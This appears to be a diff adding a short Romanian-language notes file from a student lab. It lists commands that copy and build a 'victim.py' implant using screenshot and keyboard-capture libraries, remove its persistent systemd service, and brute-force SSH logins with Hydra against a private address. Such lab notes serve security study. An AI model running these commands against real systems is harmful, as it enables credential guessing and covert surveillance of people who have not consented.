@@ -1,0 +1,23 @@
+Copiere script victima pe vm:
+scp -i /Users/adim/Desktop/FACULTATE/LICENTA/EC2TUTORIAL.cer victim.py ubuntu@10.177.186.4:/home/ubuntu/VICTIMHERE
+
+
+Creare executabil pe victima:
+pip3 install requests mss pynput && pyinstaller --onefile victim.py
+
+Stergere executabil/serviciu victima:
+systemctl --user stop victim.service
+systemctl --user disable victim.service
+rm ~/.config/systemd/user/victim.service
+rm ~/.config/systemd/user/default.target.wants/victim.service
+rm ~/.local/bin/victim
+systemctl --user daemon-reload
+systemctl --user list-units --type=service | grep victim
+systemctl --user restart
+
+
+Stergere pachete executabil:
+rm -rf /build /dist victim.py victim.spec
+
+Brute force ssh with Hydra:
+ hydra -L usernames.txt -P passlist.txt ssh://10.177.186.5 -t 8
